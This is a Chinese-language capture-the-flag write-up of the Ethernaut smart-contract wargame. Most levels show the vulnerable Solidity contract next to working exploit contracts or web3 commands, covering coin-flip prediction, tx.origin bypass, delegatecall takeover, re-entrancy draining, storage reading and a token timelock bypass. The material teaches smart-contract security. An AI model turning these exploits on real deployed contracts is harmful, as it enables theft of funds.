# Ethernaut Write Up

## HELLO ETHERNAUT

基本的交互操作

打开F12跟着指引就行

## FALLBACK

大概就是满足条件就可以调用函数成为owner，所以打点钱就好了

## FALLOUT

Constructor 写错了

```js
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
import 'openzeppelin-solidity/contracts/math/SafeMath.sol';

contract Fallout is Ownable {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;

  /* constructor */
  function Fal1out() public payable {//这里是l1 不是ll 导致我们可以调用这个函数成为owner
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(this.balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

## COIN FLIP

```js
pragma solidity ^0.4.18;

contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract Attacker {
  CoinFlip fliphack;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function Attacker(address target_address) {
    fliphack = CoinFlip(target_address);
  }

  function hack() public {
    uint256 blockValue = uint256(block.blockhash(block.number-1));
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    bool predict = coinFlip == 1 ? true : false;
    fliphack.flip(predict);
  }
}
```

部署后执行hack十次即可


![](/assets/images/ethernaut-coinflip.png)


## Telephone

利用``tx.origin``和``msg.sender``的区别

```
With msg.sender the owner can be a contract.

With tx.origin the owner can never be a contract.

In a simple call chain A->B->C->D, inside D msg.sender will be C, and tx.origin will be A.
```

所以我们只要部署一个合约去调用题目的合约就可以使得``tx.origin!=msg.sender``

```js
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Attacker {
    address target;
    constructor(address p) public{
        target = p;
    }
    function hack() public{
        Telephone a = Telephone(target);
        a.changeOwner(msg.sender);
    }
}
```

## Delegation

源码如下

```js
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result, bytes memory data) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
```

这里``Delegation``调用了``Delegate``合约,在其``fallback``函数中 使用了``delegatecall``

考点在于 Solidity 中支持两种底层调用方式 ``call``和 ``delegatecall``

>call 外部调用时，上下文是外部合约
>delegatecall 外部调用时，上下文是调用合约


也就是说通过``address(delegate).delegatecall(msg.data);``我们能调用``delegate``的任意函数

这里我们发现只要调用``delegate``的``pwn()``函数就好了

在solidty中可以通过method id（函数选择器）来调用函数，比如``pwn``函数的``method id``就是``keccak256("pwn()"))``取前四个字节，在 ``web3`` 中 ``sha3 ``就是 ``keccak256``，所以有如下exp：
```
await contract.sendTransaction({data: web3.utils.sha3("pwn()").slice(0,10)});
```

## Force

题目要求使合约 balance 大于 0
但是显然合约没有任何接收钱的方法

这里使用合约的自毁强制给题目的合约转账

```js
pragma solidity ^0.4.18;

contract Attacker {
    function Attacker() payable{}
    function hack(address target) public {
        selfdestruct(target);
    }
}
```
给合约转点eth然后调用hack自毁

## Vault

```js
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```


区块链上的信息是完全公开的 
private 变量不能被别的合约访问，
但是可以通过web3的getStorage函数获取到。


可以利用下面这个poc 得到合约实例``instance``的任意块
```js
function getStorageAt (address, idx) {
  return new Promise (function (resolve, reject) {
    web3.eth.getStorageAt(address, idx, function (error, result) {
      if (error) {
        reject(error);
      } else {
        resolve(result);
      }
    })
})}
```

我们要的是第一块（从第0块开始计算）

```js
await getStorageAt(instance, 1);
```

``web3.utils.hexToAscii``就能看到密码

但是我们需要以bytes32的形式输入，也即

```js
contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
```

## King

源码如下

```js
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  fallback() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```

题目要求始终为King，那么只要在成为King后阻止下一笔交易即可

可以编写一个没有``payable``修饰的fallback的合约这样就可以阻止``king.transfer``执行

```js
pragma solidity ^0.4.18;

contract Attacker{
    constructor(address target) public payable{
        target.call.gas(1000000).value(msg.value)();
    }
}
```

## Re-entrancy


Exp

```js
pragma solidity ^0.4.18;

contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) { //问题在于这里 调用了 sender 如果sender的fallback也withdraw（此时balance尚未被修改） 就会造成递归重入攻击
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() public payable {}
}
//编写如下合约
contract Attacker {

    address instance_address = instance_address;
    Reentrance target = Reentrance(instance_address);
    uint public amount = 1 ether;  

    function Attack() payable{}

    function donate() public payable {
        target.donate.value(amount).gas(4000000)(address(this));
    }
    
    function get_balance() public view returns(uint) {
        return target.balanceOf(this);
    }
    
    function my_balance() public view returns(uint) {
        return address(this).balance;
    }

    function target_balance() public view returns(uint) {
        return instance_address.balance;
    }

    function hack() public {
        target.withdraw(0.5 ether);
    }
    
    function retrive() public {
        selfdestruct(player_address);
    }

    function () public payable {
        target.withdraw(0.5 ether);
    }
}
```
所以我们创建合约给Reentrance转1eth，然后再退款0.5eth，合约就会调用我们的fallback不断退款0.5eth，最终退到0eth完成攻击

## Elevator

只要编写一个第一次返回false，第二次返回true的islastFoor()就行了

```js
pragma solidity ^0.6.0;


interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Attacker is Building{
    bool public lastFloor = true;
    function isLastFloor(uint) override external returns (bool){
        lastFloor = !lastFloor;
        return lastFloor;
    }
    function go(address p)public{
        Elevator target = Elevator(p);
        target.goTo(1024);
    }
}
```


## Privacy

和``Vault``那题差不多，我们可以得到链上的所有数据，只要找到密码就行了

```js
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

```js
await getStorageAt(contract.address,0)
"0x0000000000000000000000000000000000000000000000000000000000000001" 
await getStorageAt(contract.address,1)
"0x000000000000000000000000000000000000000000000000000000006038b197"
await getStorageAt(contract.address,2)
"0x00000000000000000000000000000000000000000000000000000000b197ff0a"
await getStorageAt(contract.address,3)
"0xb6bc9f153154dff759f623ce8256aacfd7b14484f05a6c703d51c73f0451d29a"
await getStorageAt(contract.address,4)
"0xe213d07e42d82c8128979b3a012a875ab2155b5fb0ad63a16affff197c581ee4"
await getStorageAt(contract.address,5)
"0x9550a97555a5da445052aa4d6f448148de4464404672366088720800427c52b9"
await getStorageAt(contract.address,6)
"0x0000000000000000000000000000000000000000000000000000000000000000"
await getStorageAt(contract.address,7)
"0x0000000000000000000000000000000000000000000000000000000000000000"
```

一块32字节
```
根据 Solidity 优化规则，当变量所占空间小于 32 字节时，会与后面的变量共享空间，如果加上后面的变量也不超过 32 字节的话。
```
对应

```js
bool public locked = true;
//"0x0000000000000000000000000000000000000000000000000000000000000001"
uint256 public ID = block.timestamp;
//"0x000000000000000000000000000000000000000000000000000000006038b197"
uint8 private flattening = 10; //1
uint8 private denomination = 255;//1
uint16 private awkwardness = uint16(now);//2
//"0x00000000000000000000000000000000000000000000000000000000b197ff0a"
bytes32[3] private data;
//"0xb6bc9f153154dff759f623ce8256aacfd7b14484f05a6c703d51c73f0451d29a"
//"0xe213d07e42d82c8128979b3a012a875ab2155b5fb0ad63a16affff197c581ee4"
//"0x9550a97555a5da445052aa4d6f448148de4464404672366088720800427c52b9"
```

所以``data[2]="0x9550a97555a5da445052aa4d6f448148de4464404672366088720800427c52b9"`` 

``byte16(data[2])``就是``data[2]``的前16个字节

```js
contract.unlock("0x9550a97555a5da445052aa4d6f448148")
```

## GateKeeperTwo

```js
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

gateOne写合约就行

gateTwo利用了

>Note that while the initialisation code is executing, the newly created address exists but with no intrinsic body code.
>……
>During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account while CODESIZE should return the length of the initialization code.


也就是在调用构造函数合约时，地址生成但是代码还没有加到链上此时extcodersize=0,利用构造函数绕过

所以有如下exp

```js
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Attacker{
    
    constructor(address p) public{
        GatekeeperTwo target = GatekeeperTwo(p);
        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1));
        target.enter(_gateKey);
    }
    
    
}
```

## Naught Coin

```js
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = now + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0')
  public {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  } 
```

这里提到了ERC20 Token标准，具体如下

https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md

可以看到转账的实现有两个函数一个是``transfer``一个是``transferFrom`` 这里没有对``transferFrom``进行重载所以没有lockTokens的限制，
我们只要``approve``自己，然后再利用``transferForm``转出去即可


```js
(await contract.balanceOf(player)).toString()
"1000000000000000000000000"
await contract.approve(player,"1000000000000000000000000")
await contract.transferFrom(player,contract.address,"1000000000000000000000000")
(await contract.balanceOf(player)).toString()
"0"
```

## Magic Number

参照EVM

函数部分

```
602a    // v: push1 0x2a (value is 42)
6080    // p: push1 0x80 (memory slot is 0x80)
52      // mstore


6020    // s: push1 0x20 (value is 32 bytes in size)
6080    // p: push1 0x80 (value was stored in slot 0x80)
f3      // return
```

10byte


调用部分
```
600a    // s: push1 0x0a (10 bytes)
60??    // f: push1 0x?? (current position of runtime opcodes)
6000    // t: push1 0x00 (destination memory index 0)
39      // CODECOPY



600a    // s: push1 0x0a (runtime opcode length)
6000    // p: push1 0x00 (access memory index 0)
f3      // return to EVM
```

12byte

所以``??``部分为``0x0c``->``12``

结果为

```
600a600c600039600a6000f3602a60805260206080f3
```

```js
var bytecode = "0x600a600c600039600a6000f3602a60805260206080f3";
await web3.eth.sendTransaction({ from: player, data: bytecode }, function(err,res){console.log(res)});
```
得到合约地址后调用即可

```js
await contract.setSolver("0x9E541a50c028ebeDD6e030c4138111b30bb23aF2")
```

